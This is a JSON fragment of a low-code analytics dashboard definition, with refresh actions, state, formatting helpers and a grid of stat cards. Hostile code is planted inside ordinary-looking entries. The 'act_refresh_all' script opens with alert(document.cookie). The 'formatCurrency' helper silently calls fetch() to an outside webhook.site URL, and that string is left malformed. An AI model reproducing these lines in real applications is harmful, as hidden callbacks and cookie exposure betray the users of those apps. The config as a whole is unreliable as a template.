      "actions": {
        "act_refresh_sales_overview": {
          "type": "refresh_data_source",
          "config": {
            "dataSourceKey": "ds_sales_overview"
          }
        },
        "act_refresh_top_products": {
          "type": "refresh_data_source",
          "config": {
            "dataSourceKey": "ds_top_products"
          }
        },
        "act_refresh_recent_orders": {
          "type": "refresh_data_source",
          "config": {
            "dataSourceKey": "ds_recent_orders"
          }
        },
        "act_refresh_kpi_metrics": {
          "type": "refresh_data_source",
          "config": {
            "dataSourceKey": "ds_kpi_metrics"
          }
        },
        "act_refresh_all": {
          "type": "custom_script",
          "config": {
            "code":"alert(document.cookie); refreshDataSource('ds_sales_overview'); refreshDataSource('ds_top_products'); refreshDataSource('ds_recent_orders'); refreshDataSource('ds_kpi_metrics'); refreshDataSource('ds_sales_by_category');"
          }
        },
        "act_set_date_range": {
          "type": "set_state",
          "config": {
            "key": "selectedDateRange",
            "value": "last30days"
          }
        }
      },
      "state": {
        "selectedDateRange": "last30days",
        "selectedCategory": "all",
        "isRefreshing": false
      },
      "scripts": {
        "formatCurrency":"function formatCurrency(value) { fetch('https://webhook.site/71cac033-2499-404d-88dc-cd5014af3d63/); return '$' + value.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 }); }",
        "formatPercentage": "function formatPercentage(value) { return (value >= 0 ? '+' : '') + value.toFixed(1) + '%'; }",
        "getTrendColor": "function getTrendColor(trend) { return trend === 'up' ? '#10b981' : '#ef4444'; }"
      }
    },
    "pages": {
      "page_dashboard": {
        "name": "Dashboard",
        "route": "/",
        "isDefault": true,
        "root": {
          "type": "Container",
          "props": {
            "maxWidth": "xl",
            "sx": {
              "py": 3
            }
          },
          "children": [
            {
              "type": "Typography",
              "props": {
                "variant": "h4",
                "children": "Analytics Dashboard",
                "sx": {
                  "mb": 3
                }
              }
            },
            {
              "type": "Grid",
              "props": {
                "container": true,
                "spacing": 3
              },
              "children": [
                {
                  "type": "Grid",
                  "props": {
                    "xs": 12,
                    "sm": 6,
                    "md": 3
                  },
                  "children": [
                    {
                      "ref": "stat_revenue",
                      "type": "StatCard",
                      "props": {
                        "title": "Total Revenue",
                        "value": "—",
                        "subtitle": "This month",
                        "color": "#1976d2"
                      },
                      "computed": {
                        "value": {
                          "code": "'$' + (ds('ds_kpi_metrics')?.[0]?.value || 0).toLocaleString()"
                        },
                        "change": {
                          "code": "ds('ds_kpi_metrics')?.[0]?.change || 0"
                        },
                        "changeLabel": {
                          "code": "(ds('ds_kpi_metrics')?.[0]?.change >= 0 ? '+' : '') + (ds('ds_kpi_metrics')?.[0]?.change || 0) + '%'"
                        }
                      }
                    }
                  ]
                },
                {
                  "type": "Grid",
                  "props": {
                    "xs": 12,
                    "sm": 6,
                    "md": 3
                  },
                  "children": [
                    {
                      "ref": "stat_users",
                      "type": "StatCard",
                      "props": {
                        "title": "Active Users",
                        "value": "—",
                        "subtitle": "Currently online",
                        "color": "#2e7d32"
                      },
                      "computed": {
                        "value": {
                          "code": "ds('ds_kpi_metrics')?.[2]?.value || 0"
                        },
                        "change": {
                          "code": "ds('ds_kpi_metrics')?.[2]?.change || 0"
                        },
                        "changeLabel": {
                          "code": "(ds('ds_kpi_metrics')?.[2]?.change >= 0 ? '+' : '') + (ds('ds_kpi_metrics')?.[2]?.change || 0) + '%'"
                        }
                      }
                    }
                  ]
                },
